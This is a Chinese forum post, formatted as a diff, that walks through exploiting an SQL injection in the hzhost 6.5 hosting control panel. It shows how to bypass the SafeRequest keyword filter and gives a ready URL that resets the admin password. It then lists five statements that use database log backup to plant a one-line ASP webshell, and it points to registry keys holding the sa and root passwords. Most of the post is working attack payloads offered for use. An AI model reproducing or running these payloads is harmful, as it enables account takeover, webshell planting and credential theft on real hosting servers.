@@ -1,0 +1,138 @@
+这次继续爆hzhost6.5虚拟主机管理系统的SQL注入漏洞。
+ 只讲两个要点。
+第一，如何拿网站管理员权限。
+ 第二，如何备份木马。
+ 这次不是简单的注射点，而是经过安全函数过滤的了点。由于对方没有将变量用单引号包起来，而过滤函数又未过滤完全，导致我们有机会进行注射。
+ 我这次还做了个动画。一并发放。希望能让大家玩得"happy"!哈哈。。。
+httP://www.xxbing.com QQ178737315
+由于我写了很长，而且很累了，所以希望大家回帖鼓励一下。
+------------开放浏览-------------
+ 漏洞存在于\hzhost\hzhost_master\control\ot2_mng\ot2_lst.asp文件中！
+-------------------------13-15行----------------------------
+ querytype=SafeRequest("querytype")  //saferequest函数接受数据
+ if chk_int(querytype)=false then  //检查是否是整数
+    ErrMsg="<font color=#ff0000>对不起</font>，非法操作！..."
+ -------------------------37-42行---------------------------
+ elseif querytype=5 then //如果类型为5。就接受qu1数据！
+   qu1=trim(SafeRequest("qu1"))      //saferequest函数接受数据，他自己定义的saferequest函数！
+   
+    if  qu1="" then  //不能为空
+         call errorpage(-2,"对不起，请选择参数！")
+   end if         
+      qstring=" and s_regstt="&qu1&" "  //这里是关键  qu1没有用单引号包围，虽然用了saferequest，但是我们可以绕过！
+ -------------------------62-65行---------------------------
+ qu7=trim(SafeRequest("qu7")) //saferequest函数接受数据
+ if qu7<>"" then
+qstring2=" and u_nme='"&qu7&"'" //这里被单引号包围了。  这里被包围了，所以这里成了死点！！
+ end if 
+ --------------------------117行-----------------------------
+ query="select * from v_ot2lst where  (s_unme='"&session("usrname")&"' or u_fatstr like '%,"&session("usrname")&",%')    "&qstring&qstring2&"  order by "&orderstring 
+ //到这里就丢进去查询了！
+
+ 来看看saferequest()函数。
+------------------incs/config.asp中-------------------------
+ Function SafeRequest(ParaName) 
+ Dim ParaValue 
+ ParaValue=Request(ParaName)  //获取数据
+ if IsNumeric(ParaValue)  then  //如果是数字
+ SafeRequest=ParaValue  //那就不过滤，直接赋值
+ exit Function
+
+ else
+ ParaValuetemp=lcase(ParaValue)    //如果不是数字，先把接到的数据全部转为小写
+ tempvalue="select |insert |delete from|'|count(|drop table|update |truncate  |asc(|mid(|char(|xp_cmdshell|exec master|net localgroup administrators|net user| or | and |%20from"
+ //定义要过滤的字符！
+
+ 他过滤方式有问题。。。没有过滤 * / % / -- / ;
+ 而且他过滤的都是select+空格。我们用select%09或者select/**/便能饶过。
+
+ temps=split(tempvalue,"|")           //转为一维数组
+ for mycount=0 to ubound(temps)       //循环读数组内数据
+ if  Instr(ParaValuetemp,temps(mycount)) > 0 then   //判断用户提交的数据是否包含了 非法字符。
+                 call errorpage(-2,"非法请求！！！")  //如果有则弹出提示！！
+                 response.end
+ end if
+ next
+ SafeRequest=ParaValue
+ end if
+ End function
+ -------------------------------------
+
+ 所以我们构造注射点的思路就是：不能出现单引号，update,select等等两边都要用%09（tab）..仔细看清楚。上面过滤的是update+空格。select+空格。
+ 先给出查询语句的框架。
+select * from v_ot2lst where  (s_unme='username' or u_fatstr like '%,username,%') and s_regstt={我们的语句} and u_nme='1' order by s_addtme desc
+
+ 为了使语句顺利执行：
+ 我们还要闭合后面的语句。我没有选择注释掉 and u_nme='1' order by s_addtme desc而是闭合他，是因为注释后，实际查询出错了。
+ 这里我给出条示范语句，即{我们的语句}
+UPDATE%09[memlst] SET u_pss=0x6531306164633339343962613539616262653536653035376632306638383365 WHERE u_nme=0x61646D696E
+
+这条语句能够绕过saferequest函数的检测。没有出现单引号。
+ 我们提交：
+http://www.xxxxxx.com/control/ot2_mng/ot2_lst.asp?querytype=5&qu7=1&ordernum=32&qu1=1;UPDATE%09[memlst] SET u_pss=0x6531306164633339343962613539616262653536653035376632306638383365 WHERE u_nme=0x61646D696E;select%09*%09from%09v_ot2lst where s_regstt=1;select%09*%09from%09v_ot2lst where s_regstt=1
+
+ 这句话就能够将admin的密码修改成123456
+ 到此第一个目的就达到了。如果admin不是超级管理员。那么请看《HZHOST域名虚拟主机管理系统sql注射漏洞》中所提到的方法。相关语句请自己转换。
+ 第二步是要备份挂马。
+ 大家看动画中的备马这么简单，当初难了我老半天。saferequest过滤了char(
+ 导致备马的这条语句失败。
+declare @a sysname,@s varchar(4000) select @a=db_name(),@s=。。。。。。。。。
+
+ 有人给我建议改成 @s ntext 等等，换类型都不行。因为我们插入的一句话木马已经固定了数据类型。。
+ 由于mssql的宽松性。我把varchar(40000)中加了个空格。并把空格替换成%09成为 varchar%09(4000)，也是可以的。这样我们就饶过了char(
+ 接下来放出详细语句。大家放入{我们的语句中}
+第 一 步:
+ create table [dbo].[shit_tmp] ([cmd] [image])--
+ 第 二 步
+ declare @a sysname,@s nvarchar%09(4000)%09select%09@a=db_name(),@s=0x7900690061006F006C007500 backup log @a to disk = @s with init,no_truncate--
+ 第 三 步
+ insert%09into%09[shit_tmp](cmd) values(0x3C25657865637574652872657175657374282261222929253E)--
+ 第 四 步
+ declare @a sysname,@s nvarchar%09(4000)%09select%09@a=db_name(),@s=0x44003A005C0068007A0068006F00730074005C0068007A0068006F00730074005F006D00610073007400650072005C0031002E00610073007000 backup log @a to disk=@s--
+ 第 五 步
+ Drop table [shit_tmp]--
+
+ 上面5句语句是在d:/hzhost/hzhost_master/下生成一个1.asp。里面包含了一个密码为a的一句话木马。
+ 一般来说，我们就能拿到webshell. 至于拿webshell后，如何取得系统权限。
+ 请看《对HZHOST域名虚拟主机管理系统sql注射漏洞进一步利用！》
+
+最后是答疑部分：
+ 1:这次是get注射，不像上次是post注射。由于没有文本框字符的限制，所以不需要保存网页到本地。
+
+ 2:123456的md5(32)值为e10adc3949ba59abbe56e057f20f883e 用mssql 16进制转换后，成为0x65003100300061006400630033003900340039006200610035003900610062006200650035003600650030003500370066003200300066003800380033006500
+ 这是转为nvarchar型的，我们直接更新这个值。会导致被更新用户的密码为乱码。所以我们要转成varchar型的。即：
+ 0x6531306164633339343962613539616262653536653035376632306638383365
+ 大家仔细观察，会发现，其实只是去掉了一些00。。
+ 所以大家在转换其他md5的时候，注意此问题。
+
+ 3:读sa密码,root密码。我们读的是加密了的。还原必须在本机，每台hzhost主机都有自己的密钥，密钥参与到加密过程。这是导致A主机不能还原B主机密码的原因。
+ 另 hzhost虚拟主机平台的所有dll文件。还有一些注册表值我都已取得。有会逆向分析的高手，能做出还原密码程序的高手请联系我。我很希望把他的加密方式弄出来。
+
+ 4:备马的问题，备份成功后，可能出现乱码，是由于截断了的原因，大家用NBSI3。去掉2个截断的勾，再生成语句执行就行了。
+ 有的服务器可能在备马的过程中出现SQL过期，超时。遇到这样的是对方数据库很大，这我也没办法。我没能找出一个比较好的解决方案。大家自己研究吧。
+
+ 5：hzhost其实不只这一个注射点，没被单引号包围的变量还有一些。大家自己去找吧。我只是拿出一个来分析。
+
+ 6：:
+sa密码。root密码。
+ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\
+ mysqlpass---root密码
+ mssqlpss----sa密码
+
+
+ 7.如果路径不在D:/hzhost
+ 那么就是你人品问题！进后台找找普通用户FTP/web的路径，也许会有些用。
+ 或者去读注册表。
+ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\ 下
+ "wwwrootpath"="e:\\wwwroot"
+ "urlsiteroot"="D:\\hzhost\\hzhost_url"
+ "ftprootpath"="e:\\ftproot"   可以看出什么？ 绝对路径放在注册表中。把注册表中的值更新到某个字段，再去读就行了。（比如用户e-mail中。。）
+ 大家自己去试。我没有碰到不在D盘的hzhost.。只是个思路！
+
+ 利用动画下载地址（送给菜鸟同学们，能看懂文章的大不必下载，只是把文章的内容完全演示了一遍。）
+hzhost最新漏洞.rar
+ 饿。纳米盘速度可能不咋地。但是由于偶的空间FTP坏了。所以，只能放到这里。抱歉啊！！
+
+ 最后，还是版权。
+http://www.xxbing.com QQ178737315
+ 允许自由转载。但请注明作者。
